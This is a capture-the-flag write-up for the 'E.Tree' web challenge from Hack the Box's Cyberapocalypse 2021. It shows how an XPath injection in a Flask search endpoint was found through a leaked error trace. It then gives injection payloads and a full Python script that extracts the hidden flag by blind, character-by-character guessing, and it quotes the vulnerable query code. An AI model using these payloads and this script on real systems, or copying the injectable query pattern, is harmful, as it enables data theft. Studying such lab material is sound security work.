---
slug: e-tree-cyberapocalypse-2021-ctf
title: E.Tree - Cyberapocalypse 2021 CTF
description: This is a writeup for the E.Tree challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.
authors: kiroki
tags: [Cyber Security, CTF]
---

This is a writeup for the E.Tree challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.

### Prompt

After many years where humans work under the aliens commands, they have been gradually given access to some of their management applications. Can you hack this alien Employ Directory web app and contribute to the greater human rebellion?

<!-- truncate -->

### Recon

We are provided with an XML file, which indicate where the flag will be hidden

```xml
<?xml version="1.0" encoding="utf-8"?>

<military>
    <district id="confidential">
    
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        
[REDACTED]
        
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
            <selfDestructCode>CHTB{f4k3_fl4g</selfDestructCode>
        </staff>
        
    </district>

    <district id="confidential">
    
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
            <selfDestructCode>_f0r_t3st1ng}</selfDestructCode>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
            
        </staff>
    </district>
</military>
```

We also have access to a site, which has a form connected to a POST endpoint  `/api/search`. Giving it a string value would return either that it has found an entry or not.

It gets interesting though, if we pass to it something which starts with an apostrphe `'`. If we pass that through Burpsuite for example, we will receive a response, that we've broken the application, with a very nice detailed error log.

![error log](/content/images/2021/04/xpath-error.png)

This log reveals to us that the application is running Flask, but also more importantly it gives us the query (in fact the whole function) that it's running to respond to our POST request.

```python
#### File "/app/app.py", line _42_, in `search`

@app.route("/api/search", methods=\["POST"\])
def search():
 name = request.json.get("search", "")
 query = "/military/district/staff\[name='{}'\]".format(name)

 if tree.xpath(query):
 	return {"success": 1, "message": "This millitary staff member exists."}

 return {"failure": 1, "message": "This millitary staff member doesn't exist."}
 ```

We can now clearly see that we're faced with the challenge of XPATH injection, and we also know where it occurs.

### Analysis

To test this out, I built the following data for the request, which would return true if the `selfDestructCode` is to be found within the structure of our XML target.

```
{"search": f"x' or count(/selfDestructCode)=1 or 'x'='y"}
```

And since this gave us the a true response, we can now start building a request to test for a flag. For that, we are going to use another boolean-returning function, namely `starts-with`.

### Solution

Since this will be a blind XML injection, we are going to have to be guessing each following symbol in our flag one by one, from a list of printable characters. Thankfully, we know how our flag starts, so this shouldn't be too difficult logistically. But, we have to not forget, that according to the XML file we were supplied with, the flag is split into two parts.

```xml
<selfDestructCode>CHTB{f4k3_fl4g</selfDestructCode>
```

```xml
<selfDestructCode>_f0r_t3st1ng}</selfDestructCode>
```

So let's write up the logic flow of our solution:

1. We generate a list of printable characters to test for.
2. We start a loop, in which we test whether the flag starts with `CHTB{ + some_char`.
3. If it does, we add `some_char` to our known flag, and continue onto the next character
4. If we run through the whole list of printable characters, without finding a match, we assume we've found the end of the string.
5. We move onto the second part of the flag, but this time we have no knowledge of how it starts
6. Repeat the loop process, and terminate with the same condition as in `4.`

```python
#!/usr/bin/env python

import requests
import string

url = 'http://138.68.179.198:30435/api/search'

listOfPrintable = list(string.printable)

def getFlagStartingWith(flag):

  while True:
    foundOneNew = False
    for char in listOfPrintable:
      # have to assume the second part doesn't also start with a capital C
      if len(flag) == 0 and char == 'C':
        continue
      flagAttempt = flag + char
      data = {"search": f"x' or //staff[starts-with(selfDestructCode, '{flagAttempt}')] or 'x'='y"}
    
      r = requests.post(url, json=data)

      check = '"success"' in r.text
      if check == True:
        flag += char
        foundOneNew = True
        print(flag)
    if foundOneNew == False:
      break
  return flag

firstPartOfFlag = getFlagStartingWith('CHTB{')
secondPartOfFlag = getFlagStartingWith('')
flag = firstPartOfFlag + secondPartOfFlag
print(flag)
```

After a bit, this will spit our flag out

```
CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}
```

import DonateCard from '@site/src/components/DonateCard';

<DonateCard/>